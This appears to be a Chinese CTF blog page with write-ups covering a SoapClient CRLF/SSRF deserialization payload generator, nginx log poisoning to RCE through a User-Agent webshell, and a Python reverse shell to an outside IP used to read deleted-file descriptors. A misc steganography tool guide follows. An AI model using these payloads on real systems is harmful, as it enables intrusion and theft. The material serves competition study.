<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence=<span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        $post_string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=abcd&#x27;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;eki\r\nContent-Type: application/x-www-form-urlencoded\r\n&quot;</span>.join(<span class="string">&quot;\r\n&quot;</span>,$headers).<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&quot;\r\n\r\n&quot;</span>.$post_string,</span><br><span class="line">            <span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild=<span class="keyword">array</span>(<span class="string">&quot;action&quot;</span>=&gt;<span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">&#x27;:&#x27;</span>, $str);</span><br><span class="line">    $newstr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/00/&#x27;</span>, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i - <span class="number">2</span>] = preg_replace(<span class="string">&#x27;/s/&#x27;</span>, <span class="string">&quot;S&quot;</span>, $arr[$i - <span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; $i &lt; count($arr) - <span class="number">1</span>; $i++) &#123;</span><br><span class="line">        $newstr .= $arr[$i];</span><br><span class="line">        $newstr .= <span class="string">&quot;:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .= $arr[$i];</span><br><span class="line">    <span class="keyword">return</span> $newstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> HelloWorld_DB();</span><br><span class="line">$a = preg_replace(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line">$urlen = urlencode($a);</span><br><span class="line">$urlen = preg_replace(<span class="string">&#x27;/%00/&#x27;</span>, <span class="string">&#x27;%5c%30%30&#x27;</span>, $urlen);</span><br><span class="line">$a = decorate(urldecode($urlen));</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure>

<p>但是很奇怪，用这个生成的payload打不通，于是我们来比对看看是哪里出了问题,测试了一下，原来问题出在http头的书写过程中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        $post_string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=abcd&#x27;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;eki\r\nContent-Type: application/x-www-form-urlencoded\r\n&quot;</span>.join(<span class="string">&quot;\r\n&quot;</span>,$headers).<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&quot;\r\n\r\n&quot;</span>.$post_string,</span><br><span class="line">            <span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = $a;</span><br></pre></td></tr></table></figure>

<h2 id="ALL-INFO-YOU-WANT"><a href="#ALL-INFO-YOU-WANT" class="headerlink" title="ALL_INFO_YOU_WANT"></a>ALL_INFO_YOU_WANT</h2><p>这种解法比较签到，是常规思路，这题的定位本来就是个白给的题目，所以就没改掉日志</p>
<p>由 http 回包 header 得知是 NGINX，直接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>

<p>但是因为 url 会被 url 编码，可以把一句话木马写在 User-Agent，另外记得一定要闭合不然 php 执行会出错，包含即可 RCE<br><strong>找flag新语句：通过文件内容找flag</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/10/jsp%E5%86%85%E5%AD%98%E5%90%97/">jsp内存马</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-10</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/09/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">电子取证</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-09</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/09/2021%E5%9B%BD%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/">2021国赛总决赛复现</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-09</time><div class="content"><h2 id="babypython-国赛总决赛复现"><a href="#babypython-国赛总决赛复现" class="headerlink" title="babypython[国赛总决赛复现]"></a>babypython[国赛总决赛复现]</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/09/V-N2020/">V&amp;N2020</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-09</time><div class="content"><h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>ctfd漏洞 cve-2020-7245</p>
<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p><strong><code>考点： 1.无回显rce 2.文件描述符</code></strong><br>分析源码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>我们先分析下几个路由，很明显，我们可以在shell这个路由执行命令，但是他是无回显的，然后接下来我们可以看到，flag.txt这个文件，会先被打开，然后再执行删除命令，所以要如何读到这个flag呢？<br><strong>文件描述符</strong><br>什么是文件描述符：内核利用文件描述符来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。</p>
<p>例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。</p>
<p><strong>文件描述符储存在什么地方：</strong><code>/proc/&lt;pid&gt;/fd&lt;id&gt;</code></p>
<p>也就是说，我们可以通过cat进程中的fd来获取到文件描述符。而文件描述符中就存储着该文件的内容</p>
<p>无回显命令执行，一般都是考虑反弹shell操作，但是这里curl等一些常见命令都执行不了，这有这个可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c </span><br><span class="line">&#39;</span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;110.42.133.120&quot;,9999));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1); </span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);</span><br><span class="line">&#39;</span><br></pre></td></tr></table></figure>

<p>接下来就使用以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;proc</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;proc&#x2F;[pid]#进程数字</span><br><span class="line">cd &#x2F;porc&#x2F;[pid]&#x2F;fd</span><br><span class="line">cat [文件描述符数字]</span><br></pre></td></tr></table></figure>

<p>进行flag的查找即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009135313.png" alt="img" style="zoom:67%;"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这题的考点让我没想到的是，原来文件描述符里面可以存储文件的信息，只要你有对他进行操作既有，以前都是光用，没想到这个~，现在就明了了</p>
<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">&#x27;success&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拿到flag的条件是data[success]的条件为true，这里有个漏洞就是这题的考点<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a><br>大致就是，如果定义了环境变量http_proxy，php内的http-api就会走这个代理。在这个phpinfo中就开启了cgi模式了，然后可以在服务器写入需要传入的一个true的内容，并在题目那边配置这个地址即可收到我们传入的content</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.2</span><br><span class="line">Date: Fri, 06 Mar 2020 18:27:31 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009144906.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009144929.png" alt="img" style="zoom:67%;">

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/09/misc%E5%85%A5%E9%97%A8/">misc入门</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-09</time><div class="content"><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><h3 id="文件头修复"><a href="#文件头修复" class="headerlink" title="文件头修复"></a>文件头修复</h3><p>常见的图片格式文件头如下：</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th>文件头</th>
</tr>
</thead>
<tbody><tr>
<td>JPEG(jpg)</td>
<td>FFD8FF</td>
</tr>
<tr>
<td>PNG(png)</td>
<td>89504E47</td>
</tr>
<tr>
<td>GIF(gif)</td>
<td>47494638</td>
</tr>
<tr>
<td>BMP</td>
<td>424DC001</td>
</tr>
</tbody></table>
<p>其他更多类型的文件头请看<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_23100787/article/details/79040925">https://blog.csdn.net/qq_23100787/article/details/79040925</a></p>
<p>方法：以16进制的方式打开文件，在文件最开始添加相应的文件头</p>
<h4 id="CRC校验修复"><a href="#CRC校验修复" class="headerlink" title="CRC校验修复"></a>CRC校验修复</h4><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009105034.jpeg" alt="img" style="zoom:67%;">

<h4 id="3-宽高修复"><a href="#3-宽高修复" class="headerlink" title="3.宽高修复"></a><strong>3.宽高修复</strong></h4><p>对于png格式的图片，宽高的数据位置如图片所展示的那样</p>
<p><img src="https://image.3001.net/images/20210320/1616208064_605560c025598e02e7b91.jpg!small" alt="img"></p>
<p>如果遇到简单一点的题目，可以直接尝试修改宽高，这里建议一般选择修改<strong>高度</strong>，一点点的改动即可。如果随意修改宽度一般都是会造成图像错误的。</p>
<blockquote>
<p>一个简单的检测宽高是否有误的方法：在Windows下能打开的图片在linux下不能打开，就说明可能是宽高存在问题</p>
</blockquote>
<p>最正确的方法则是通过crc值爆破宽高，给出大佬的脚本（记不得是哪里找到的了）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#-*- coding:UTF-8 -*-</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">import os</span><br><span class="line">crcbp &#x3D; open(&quot;flag.png&quot;,&quot;rb&quot;).read()#填文件名</span><br><span class="line">for i in range(1024):</span><br><span class="line">    for j in range(1024):</span><br><span class="line">        data &#x3D; crcbp[12:16] + struct.pack(&#39;&gt;i&#39;,i) + struct.pack(&#39;&gt;i&#39;,j) + crcbp[24:29]</span><br><span class="line">        crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">        if crc32 &#x3D;&#x3D; 0x4d614986 :#此处填CRC值</span><br><span class="line">            print (i);</span><br><span class="line">            print (j);</span><br><span class="line">            print (hex(i),hex(j))</span><br></pre></td></tr></table></figure>

<p>爆破出来后修改即可。</p>
<p>对于<strong>jpg</strong>格式的图片也存在宽高隐写，有师傅写的很详细了，此处不再赘述。有需要的朋友请移步：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010391191/article/details/80811813">https://blog.csdn.net/u010391191/article/details/80811813</a></p>
<h3 id="4-LSB隐写"><a href="#4-LSB隐写" class="headerlink" title="4.LSB隐写"></a>4.LSB隐写</h3><p>有关该隐写方式的原理网上已经有很多文章写过了，此处简单说一下做题方法。</p>
<p>工具：stegsolve（需要java环境）</p>
<p>用该工具打开图片后，点击<img src="https://image.3001.net/images/20210320/1616209932_6055680c923adb2cadca5.png!small?1616209932678" alt="1616209932_6055680c923adb2cadca5.png!small?1616209932678">然后按照如下图片点击<img src="https://image.3001.net/images/20210320/1616210229_6055693533f311bdd67e9.png!small?1616210229611" alt="1616210229_6055693533f311bdd67e9.png!small?1616210229611">最后点击preview。有时候点preview没用，需要点击最下面的save text或者save bin才能得出结果。这张图只是给出了示例，具体做题的时候可以多试一下和其他按键的组合。</p>
<p>还有一个比较简单的方法，用<strong>zsteg</strong>工具，需要kali里面在线安装：gem install zsteg</p>
<p>使用命令格式：zsteg filename</p>
<h3 id="5-对于两张相同图片的隐写"><a href="#5-对于两张相同图片的隐写" class="headerlink" title="5.对于两张相同图片的隐写"></a>5.对于两张相同图片的隐写</h3><p><strong>1.盲水印</strong></p>
<p>两张相同的图片首先考虑盲水印。使用方法及脚本移步<a target="_blank" rel="noopener" href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p>
<p><strong>2.组合进行不同运算（and、or、xor等）</strong></p>
<p>还是用stegsolve，点击<img src="https://image.3001.net/images/20210320/1616210657_60556ae10459af20228c1.png!small?1616210657114" alt="1616210657_60556ae10459af20228c1.png!small?1616210657114">之后会再让你打开一张图片，此时需要注意两张图片的打开<strong>顺序</strong>不同，运算的结果也不同，实际操作中就需要各位来回试一下了</p>
<h3 id="6-文件分离"><a href="#6-文件分离" class="headerlink" title="6.文件分离"></a>6.文件分离</h3><p>常用工具：binwalk、formost、dd</p>
<p><strong>binwalk</strong>：可快速分辨文件是否由多个文件合并而成，并将文件进行分离。如果分离成功会在目标文件的目录。</p>
<p>分析文件：binwalk filename</p>
<p>分离文件：binwalk -e filename</p>
<p><strong>formost</strong>命令：formost filename -o 输出的目录名</p>
<p>因本人较懒，所以用了一个师傅说的方法，在用formost分离文件时很方便（不用敲命令）。参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39368007/article/details/91129628">https://blog.csdn.net/qq_39368007/article/details/91129628</a></p>
<p><strong>dd</strong>：当文件自动分离出错或者因为其他原因无法自动分离时使用</p>
<p><img src="https://image.3001.net/images/20210320/1616211319_60556d771acf19840fa03.jpg!small" alt="img">ps：如果一个工具分离不出来一定要多试几种，因为每种工具分离方法都有所差别，难免会出现分离不出来的情况。</p>
<h3 id="7-二维码"><a href="#7-二维码" class="headerlink" title="7.二维码"></a>7.二维码</h3><p><strong>取反色</strong></p>
<p>有一道题就是将二维码颜色取反再扫描得出结果，记不得是哪里的了。具体操作可以用windows自带的画图工具，打开图片然后点击主页的选择<img src="https://image.3001.net/images/20210320/1616227603_6055ad138ab71dcb1211d.png!small?1616227603841" alt="1616227603_6055ad138ab71dcb1211d.png!small?1616227603841">选中图片后右键选择反色<img src="https://image.3001.net/images/20210320/1616227637_6055ad354400e7dcbc8d7.png!small?1616227637530" alt="1616227637_6055ad354400e7dcbc8d7.png!small?1616227637530">当你发现二维码的三个定位点是白色的时候，就说明需要进行反色操作了</p>
<h3 id="8-一些其他常用工具介绍"><a href="#8-一些其他常用工具介绍" class="headerlink" title="8.一些其他常用工具介绍"></a>8.一些其他常用工具介绍</h3><p>针对jpg格式图片的隐写：</p>
<p><a target="_blank" rel="noopener" href="http://steghide.sourceforge.net/download.php"><strong>steghide</strong></a></p>
<p><strong>用法</strong>：</p>
<p>隐藏文件<br>steghide embed -cf [图片或wav文件载体] -ef [待隐藏文件]<br>steghide embed -cf 1.jpg -ef 1.txt</p>
<p>查看图片中嵌入的文件信息<br>steghide info 1.jpg</p>
<p>提取图片中隐藏的文件<br>steghide extract -sf 1.jpg</p>
<blockquote>
<p>stegdetect（可检测通过JSteg,JPHide,OutGuess,Invisible,F5,oppendX,Camouflage等隐写工具隐藏的信息）</p>
</blockquote>
<p><strong>用法</strong>：</p>
<blockquote>
<p>stegdetect xxx.jpg</p>
<p>stegdetect -s 敏感度 xxx.jpgexi</p>
<p>stegbreak（爆破密码）<br>stegbreak.exe -r rules.ini -f password.txt p -c hide.jpg</p>
</blockquote>
<p><strong>jphide</strong></p>
<ul>
<li><img src="https://image.3001.net/images/20210320/1616211928_60556fd847b8890e476d8.png!small" alt="img">silenteye（下面会有一定的介绍，用法基本一致）</li>
</ul>
<h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="1-针对mp3文件的隐写"><a href="#1-针对mp3文件的隐写" class="headerlink" title="1.针对mp3文件的隐写"></a><strong>1.针对mp3文件的隐写</strong></h3><p>将分别介绍以下工具：Audacity、MP3Stego</p>
<p><a target="_blank" rel="noopener" href="https://audacity.en.softonic.com/">Audacity</a></p>
<p>一般得到题目文件，打开听到有杂音首选用这个工具打开。简单的题目就是在原音频中加入了一段摩斯密码，通过这个工具可以直接看出来</p>
<p><img src="https://image.3001.net/images/20210320/1616218195_605588537af8362ba567f.png!small" alt="img">然后解密即可。</p>
<p>难一点的题目则是对音频进行频谱分析，比如这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/vhkjhwbs/article/details/103036133%E8%B0%88%E5%88%B0%E7%9A%84lookme%E5%92%8C%E7%94%A8%E7%9C%BC%E7%9D%9B%E5%8E%BB%E5%80%BE%E5%90%AC%E8%BF%99%E4%B8%A4%E9%81%93%E9%A2%98%E3%80%82">https://blog.csdn.net/vhkjhwbs/article/details/103036133谈到的lookme和用眼睛去倾听这两道题。</a></p>
<p>MP3Stego</p>
<p>如果mp3 文件听上去没有什么奇怪的地方，那么就试试用这个工具。教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/myloveprogrmming/article/details/52641916">https://blog.csdn.net/myloveprogrmming/article/details/52641916</a></p>
<p>用这个工具会输入密码，有时候题目没有特别提示就可以试试弱口令，有时候甚至就是题目名字。</p>
<h3 id="2-针对wav文件的隐写"><a href="#2-针对wav文件的隐写" class="headerlink" title="2.针对wav文件的隐写"></a>2.针对wav文件的隐写</h3><p>工具：silenteye</p>
<p><img src="https://image.3001.net/images/20210320/1616218647_60558a175fc225d11a3cb.png!small" alt="img"></p>
<p>将文件拖到里面点击decode</p>
<p><img src="https://image.3001.net/images/20210320/1616219110_60558be69cb4a29f9b5b0.png!small?1616219110893" alt="1616219110_60558be69cb4a29f9b5b0.png!small?1616219110893">简单的题目此时再点右下角的decode就能出结果，稍微绕点的就还需要<img src="https://image.3001.net/images/20210320/1616218742_60558a76a44a76b41701c.png!small?1616218743088" alt="1616218742_60558a76a44a76b41701c.png!small?1616218743088">勾选这里输入密码，或者选择正确的type，看出题人的心思了~</p>
<p><img src="https://image.3001.net/images/20210320/1616218784_60558aa0c70f5b6d4606f.png!small?1616218784960" alt="1616218784_60558aa0c70f5b6d4606f.png!small?1616218784960"></p>
<p>当然，这个工具还能对<strong>bmp、jpg</strong>格式的隐写文件进行解密</p>
<h2 id="视频隐写"><a href="#视频隐写" class="headerlink" title="视频隐写"></a>视频隐写</h2><h3 id="1-针对mp4文件的隐写"><a href="#1-针对mp4文件的隐写" class="headerlink" title="1.针对mp4文件的隐写"></a>1.针对mp4文件的隐写</h3><p>工具：ffmpeg（一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。）</p>
<p>详细使用教程介绍：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Allyli0022/article/details/78355248">https://blog.csdn.net/Allyli0022/article/details/78355248</a></p>
<p>一般在题目中会插入一些图片，由于一下就闪过了所以需要用这个工具按帧提取出来，简单的题目往往这样就能做出来了。</p>
<h2 id="文本隐写"><a href="#文本隐写" class="headerlink" title="文本隐写"></a>文本隐写</h2><h3 id="1-word文档隐写"><a href="#1-word文档隐写" class="headerlink" title="1.word文档隐写"></a>1.word文档隐写</h3><p>白色文字</p>
<p>由于一般word文档都是白色为底色，所以如果文本字体设置的是白色，就看不出来有东西，这个时候可以试试<strong>ctrl+a</strong>，全选文字</p>
<p><img src="https://image.3001.net/images/20210320/1616222817_60559a617585519deeeaa.png!small?1616222817668" alt="1616222817_60559a617585519deeeaa.png!small?1616222817668"></p>
<p>再把颜色改成其他颜色，就能看出来被隐藏的文字了</p>
<p><strong>隐藏文字选项</strong></p>
<p>在文本出右键鼠标，字体选项中有一处隐藏文字选项<img src="https://image.3001.net/images/20210320/1616222980_60559b04517f08d9681bd.png!small?1616222980656" alt="1616222980_60559b04517f08d9681bd.png!small?1616222980656">取消勾选后被隐藏的文字就出现了<img src="https://image.3001.net/images/20210320/1616222937_60559ad95afa4b0ecc0f0.png!small?1616222937529" alt="1616222937_60559ad95afa4b0ecc0f0.png!small?1616222937529"></p>
<h3 id="2-PDF隐写"><a href="#2-PDF隐写" class="headerlink" title="2.PDF隐写"></a>2.PDF隐写</h3><p>wbs43open（可用于PDF、bmp等文件的隐写）</p>
<p><img src="https://image.3001.net/images/20210320/1616223111_60559b879a5b8bb7bff13.png!small" alt="1616223111_60559b879a5b8bb7bff13.png!small"></p>
<p>点击continue后会出现encode和decode，解密就选decode，然后第三步就选择文件类型和文件</p>
<p><img src="https://image.3001.net/images/20210320/1616223176_60559bc85ad7d38896b5a.png!small" alt="1616223176_60559bc85ad7d38896b5a.png!small"></p>
<p>第四步步设置密码，可以置空</p>
<p><img src="https://image.3001.net/images/20210320/1616223637_60559d9519ea72fcbf03a.png!small" alt="1616223637_60559d9519ea72fcbf03a.png!small"></p>
<p>第五步设置解密之后文件的存储路径及文件名</p>
<p><img src="https://image.3001.net/images/20210320/1616223715_60559de338f52f5b9799b.png!small" alt="1616223715_60559de338f52f5b9799b.png!small"></p>
<p>接下来第六步完成就行啦</p>
<p>要出这种类型的隐写题同样用这个工具也行。</p>
<h3 id="3-html隐写"><a href="#3-html隐写" class="headerlink" title="3.html隐写"></a>3.html隐写</h3><p>即snow隐写，需要告诉key，解密网站<a target="_blank" rel="noopener" href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a></p>
<h2 id="其他类型的隐写"><a href="#其他类型的隐写" class="headerlink" title="其他类型的隐写"></a>其他类型的隐写</h2><h3 id="1-base64隐写"><a href="#1-base64隐写" class="headerlink" title="1.base64隐写"></a>1.base64隐写</h3><p>Tr0y师傅的文章讲解的很详细，在这里就不过多介绍了，请移步<a target="_blank" rel="noopener" href="https://www.tr0y.wang/2017/06/14/Base64steg/">https://www.tr0y.wang/2017/06/14/Base64steg/</a></p>
